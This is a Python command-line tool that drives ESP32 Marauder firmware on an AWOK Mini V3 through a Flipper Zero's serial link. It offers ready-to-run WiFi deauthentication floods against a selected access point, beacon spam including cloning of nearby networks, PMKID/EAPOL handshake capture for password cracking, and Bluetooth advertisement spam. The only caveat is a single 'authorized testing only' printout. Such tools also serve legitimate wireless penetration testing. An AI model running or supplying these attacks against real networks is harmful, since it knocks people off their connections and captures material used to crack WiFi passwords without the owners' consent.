#!/usr/bin/env python3
"""
ESP32 Marauder CLI Interface (AWOK Mini V3)
Controls WiFi/Bluetooth attacks via Flipper Zero GPIO UART

The AWOK Mini V3 connects to Flipper via GPIO UART.
This script sends Marauder commands through that connection.

Usage:
    python marauder_cli.py [command]

Commands:
    shell       - Interactive shell
    scan        - Scan for WiFi networks
    deauth      - Deauthentication attack
    beacon      - Beacon spam attack
    sniff       - Sniff packets
    btspam      - Bluetooth spam
"""

import serial
import serial.tools.list_ports
import sys
import time
import os

class MarauderCLI:
    def __init__(self):
        self.serial = None
        self.connected = False
        self.networks = []

    def find_device(self):
        """Find AWOK/ESP32 USB port"""
        ports = serial.tools.list_ports.comports()

        for port in ports:
            # ESP32 common VIDs
            if port.vid in [0x10C4, 0x1A86, 0x303A]:  # CP210x, CH340, ESP32-S2
                return port.device
            if "esp32" in port.description.lower() or "cp210" in port.description.lower():
                return port.device

        # Try common paths
        for path in ["/dev/ttyUSB0", "/dev/ttyUSB1", "/dev/ttyACM1"]:
            if os.path.exists(path):
                return path

        return None

    def connect(self):
        """Connect to ESP32 Marauder"""
        port = self.find_device()
        if not port:
            print("ERROR: ESP32/AWOK not found")
            print("Make sure AWOK Mini V3 is connected")
            return False

        try:
            self.serial = serial.Serial(
                port=port,
                baudrate=115200,
                timeout=None,  # No timeout - permanent connection
                write_timeout=5
            )

            time.sleep(1)
            self.serial.reset_input_buffer()

            self.connected = True
            print(f"CONNECTED to {port}")
            print("=" * 40)
            return True

        except Exception as e:
            print(f"ERROR: {e}")
            return False

    def send_command(self, cmd, timeout=30):
        """Send Marauder command"""
        if not self.connected:
            return "Not connected"

        try:
            self.serial.reset_input_buffer()
            self.serial.write(f"{cmd}\n".encode())
            self.serial.flush()

            response = ""
            start = time.time()

            while time.time() - start < timeout:
                if self.serial.in_waiting:
                    chunk = self.serial.read(self.serial.in_waiting).decode('utf-8', errors='ignore')
                    response += chunk
                    print(chunk, end='', flush=True)  # Real-time output

                    # Check for completion indicators
                    if "Stopped" in response or ">" in response:
                        break
                time.sleep(0.1)

            return response

        except Exception as e:
            return f"Error: {e}"

    def disconnect(self):
        """Disconnect"""
        self.connected = False
        if self.serial:
            try:
                self.serial.close()
            except:
                pass
        print("\nDisconnected")

    # ==================
    # WIFI ATTACKS
    # ==================

    def scan_networks(self):
        """Scan for WiFi networks"""
        print("\n" + "=" * 50)
        print("  WIFI NETWORK SCAN")
        print("=" * 50)
        print("Scanning... (takes ~10 seconds)")
        print()

        self.send_command("scanap", timeout=15)
        print()

        # Get list
        self.send_command("list -a", timeout=5)

        return self.networks

    def select_target(self, index):
        """Select target AP by index"""
        print(f"\nSelecting target AP {index}...")
        result = self.send_command(f"select -a {index}", timeout=5)
        return result

    def deauth_attack(self, target_index=None):
        """Launch deauthentication attack"""
        print("\n" + "=" * 50)
        print("  DEAUTHENTICATION ATTACK")
        print("=" * 50)
        print("⚠️  FOR AUTHORIZED TESTING ONLY!")
        print()

        if target_index is not None:
            self.select_target(target_index)

        print("Starting deauth flood...")
        print("Press Ctrl+C to stop")
        print()

        try:
            self.send_command("attack -t deauth", timeout=300)
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.send_command("stopscan", timeout=5)

    def beacon_spam(self, mode="random"):
        """Beacon spam attack"""
        print("\n" + "=" * 50)
        print("  BEACON SPAM ATTACK")
        print("=" * 50)

        if mode == "random":
            print("Spamming random SSIDs...")
            cmd = "attack -t beacon -r"
        elif mode == "list":
            print("Spamming from SSID list...")
            cmd = "attack -t beacon -l"
        else:
            print("Cloning nearby APs...")
            cmd = "attack -t beacon -a"

        print("Press Ctrl+C to stop")
        print()

        try:
            self.send_command(cmd, timeout=300)
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.send_command("stopscan", timeout=5)

    def sniff_pmkid(self):
        """Sniff for PMKID/EAPOL"""
        print("\n" + "=" * 50)
        print("  PMKID/EAPOL SNIFFER")
        print("=" * 50)
        print("Capturing handshakes...")
        print("Press Ctrl+C to stop")
        print()

        try:
            self.send_command("sniffpmkid", timeout=600)
        except KeyboardInterrupt:
            print("\nStopping...")
            self.send_command("stopscan", timeout=5)

    def bt_spam(self):
        """Bluetooth spam"""
        print("\n" + "=" * 50)
        print("  BLUETOOTH SPAM")
        print("=" * 50)
        print("Spamming BLE advertisements...")
        print("Press Ctrl+C to stop")
        print()

        try:
            self.send_command("btspamall", timeout=300)
        except KeyboardInterrupt:
            print("\nStopping...")
            self.send_command("stopscan", timeout=5)

    def stop_all(self):
        """Stop all running attacks"""
        print("Stopping all attacks...")
        self.send_command("stopscan", timeout=5)

    def interactive_shell(self):
        """Interactive CLI"""
        print("\n" + "=" * 50)
        print("  ESP32 MARAUDER CLI")
        print("=" * 50)
        print("Commands: scanap, list -a, select -a <n>, attack -t deauth")
        print("          attack -t beacon -r, sniffpmkid, btspamall, stopscan")
        print("Type 'exit' to quit")
        print()

        while self.connected:
            try:
                cmd = input("marauder> ").strip()

                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                elif cmd == "":
                    continue

                self.send_command(cmd)
                print()

            except KeyboardInterrupt:
                print("\nUse 'exit' to quit or 'stopscan' to stop attacks")
            except EOFError:
                break


def main():
    marauder = MarauderCLI()

    if not marauder.connect():
        sys.exit(1)

    try:
        if len(sys.argv) > 1:
            cmd = sys.argv[1].lower()

            if cmd == "scan":
                marauder.scan_networks()
            elif cmd == "deauth":
                target = int(sys.argv[2]) if len(sys.argv) > 2 else None
                marauder.deauth_attack(target)
            elif cmd == "beacon":
                mode = sys.argv[2] if len(sys.argv) > 2 else "random"
                marauder.beacon_spam(mode)
            elif cmd == "sniff":
                marauder.sniff_pmkid()
            elif cmd == "btspam":
                marauder.bt_spam()
            elif cmd == "stop":
                marauder.stop_all()
            elif cmd == "shell":
                marauder.interactive_shell()
            else:
                marauder.send_command(" ".join(sys.argv[1:]))
        else:
            marauder.interactive_shell()

    except KeyboardInterrupt:
        print("\nInterrupted")
    finally:
        marauder.disconnect()


if __name__ == "__main__":
    main()
